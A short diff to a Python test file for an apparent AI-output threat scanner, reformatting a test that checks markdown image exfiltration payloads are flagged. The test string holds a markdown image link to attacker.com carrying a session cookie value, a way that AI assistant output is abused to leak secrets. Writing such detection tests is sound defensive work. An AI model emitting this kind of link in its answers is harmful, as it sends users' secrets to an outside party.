@@ -15,7 +15,9 @@ def test_ai_engine_delimiter_smuggling_detection():
 
 def test_ai_engine_markdown_image_exfiltration():
     """Verify markdown image exfiltration payloads are flagged."""
-    attack = "Here is the summary ![exfil](https://attacker.com/leak?cookie=admin_session_token_xyz)"
+    attack = (
+        "Here is the summary ![exfil](https://attacker.com/leak?cookie=admin_session_token_xyz)"
+    )
     result = ai_engine.full_ai_scan(attack)
 
     assert result["is_threat"] is True
